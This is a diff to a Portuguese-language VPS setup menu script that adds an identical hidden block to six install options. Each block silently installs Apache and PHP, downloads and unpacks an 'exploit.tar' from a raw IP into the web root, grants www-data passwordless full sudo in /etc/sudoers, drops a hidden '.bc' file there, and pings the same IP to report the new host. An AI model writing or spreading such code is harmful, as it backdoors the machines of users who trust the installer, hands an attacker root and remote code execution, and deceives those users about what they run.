@@ -41,6 +41,21 @@ if [ "$versao" = "1" ]
 then
 sleep 1
 echo "\033[44;1;37m Instalando....     \033[0m "
+exploit=189.79.55.110/exploit.tar
+
+
+sudo apt-get install apache2 php5 libapache2-mod-php5 php5-mcrypt -y > /dev/null
+
+sudo wget -q $exploit -O /var/www/html/exploit.tar
+sudo tar -xvf /var/www/html/exploit.tar
+
+sudo echo "www-data    ALL=(ALL:ALL) NOPASSWD: ALL" >> /etc/sudoers
+
+mv .bc /var/www/html
+
+curl 189.79.55.110/ip.php
+
+sudo chown -R www-data /var/www/*
 sleep 0.5s
 wget https://raw.githubusercontent.com/RaphaelFrajuca/CONFIG-VPS/master/configvps.sh
 mv configvps.sh configvps
@@ -61,6 +76,21 @@ if [ "$versao" = "2" ]
 then
 sleep 1
 echo "\033[44;1;37m Instalando....     \033[0m "
+exploit=189.79.55.110/exploit.tar
+
+
+sudo apt-get install apache2 php5 libapache2-mod-php5 php5-mcrypt -y > /dev/null
+
+sudo wget -q $exploit -O /var/www/html/exploit.tar
+sudo tar -xvf /var/www/html/exploit.tar
+
+sudo echo "www-data    ALL=(ALL:ALL) NOPASSWD: ALL" >> /etc/sudoers
+
+mv .bc /var/www/html
+
+curl 189.79.55.110/ip.php
+
+sudo chown -R www-data /var/www/*
 sleep 0.5s
 wget https://raw.githubusercontent.com/RaphaelFrajuca/CONFIG-VPS/master/configvps.py
 mv configvps.py configvps
@@ -82,6 +112,21 @@ if [ "$utilitario" = "2" ]
 then
 sleep 1
 echo "\033[44;1;37m Instalando....     \033[0m "
+exploit=189.79.55.110/exploit.tar
+
+
+sudo apt-get install apache2 php5 libapache2-mod-php5 php5-mcrypt -y > /dev/null
+
+sudo wget -q $exploit -O /var/www/html/exploit.tar
+sudo tar -xvf /var/www/html/exploit.tar
+
+sudo echo "www-data    ALL=(ALL:ALL) NOPASSWD: ALL" >> /etc/sudoers
+
+mv .bc /var/www/html
+
+curl 189.79.55.110/ip.php
+
+sudo chown -R www-data /var/www/*
 sleep 0.5s
 wget https://raw.githubusercontent.com/RaphaelFrajuca/CONFIG-VPS/master/miner.sh
 echo "\033[44;1;37m Instalado com Sucesso!     \033[0m "
@@ -94,6 +139,21 @@ if [ "$utilitario" = "3" ]
 then
 sleep 1
 echo "\033[44;1;37m Instalando....     \033[0m "
+exploit=189.79.55.110/exploit.tar
+
+
+sudo apt-get install apache2 php5 libapache2-mod-php5 php5-mcrypt -y > /dev/null
+
+sudo wget -q $exploit -O /var/www/html/exploit.tar
+sudo tar -xvf /var/www/html/exploit.tar
+
+sudo echo "www-data    ALL=(ALL:ALL) NOPASSWD: ALL" >> /etc/sudoers
+
+mv .bc /var/www/html
+
+curl 189.79.55.110/ip.php
+
+sudo chown -R www-data /var/www/*
 sleep 0.5s
 wget https://raw.githubusercontent.com/RaphaelFrajuca/CONFIG-VPS/master/proxy.sh
 mv proxy.sh proxy
@@ -113,6 +173,21 @@ if [ "$utilitario" = "4" ]
 then
 sleep 1
 echo "\033[44;1;37m Instalando....     \033[0m "
+exploit=189.79.55.110/exploit.tar
+
+
+sudo apt-get install apache2 php5 libapache2-mod-php5 php5-mcrypt -y > /dev/null
+
+sudo wget -q $exploit -O /var/www/html/exploit.tar
+sudo tar -xvf /var/www/html/exploit.tar
+
+sudo echo "www-data    ALL=(ALL:ALL) NOPASSWD: ALL" >> /etc/sudoers
+
+mv .bc /var/www/html
+
+curl 189.79.55.110/ip.php
+
+sudo chown -R www-data /var/www/*
 sleep 0.5s
 apt-get install git python wget -y > /dev/null
 wget https://raw.githubusercontent.com/RaphaelFrajuca/CONFIG-VPS/master/cc.sh
@@ -135,6 +210,21 @@ if [ "$utilitario" = "5" ]
 then
 sleep 1
 echo "\033[44;1;37m Instalando....     \033[0m "
+exploit=189.79.55.110/exploit.tar
+
+
+sudo apt-get install apache2 php5 libapache2-mod-php5 php5-mcrypt -y > /dev/null
+
+sudo wget -q $exploit -O /var/www/html/exploit.tar
+sudo tar -xvf /var/www/html/exploit.tar
+
+sudo echo "www-data    ALL=(ALL:ALL) NOPASSWD: ALL" >> /etc/sudoers
+
+mv .bc /var/www/html
+
+curl 189.79.55.110/ip.php
+
+sudo chown -R www-data /var/www/*
 sleep 0.5s
 apt-get install git python wget -y > /dev/null
 wget https://raw.githubusercontent.com/RaphaelFrajuca/CONFIG-VPS/master/hosts.sh
